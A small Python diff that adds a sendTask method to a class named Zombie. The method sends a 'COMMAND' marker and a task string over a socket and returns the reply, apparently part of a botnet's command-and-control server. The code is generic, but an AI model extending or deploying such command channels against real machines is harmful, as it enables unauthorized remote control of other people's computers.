@@ -29,3 +29,8 @@ class Zombie(threading.Thread):
 		except (timeout, error):
 			return False
 
+
+	def sendTask(self, task):
+		self.openedSocket.send(b"COMMAND")
+		self.openedSocket.send(str.encode(task))
+		return self.openedSocket.recv(1024)
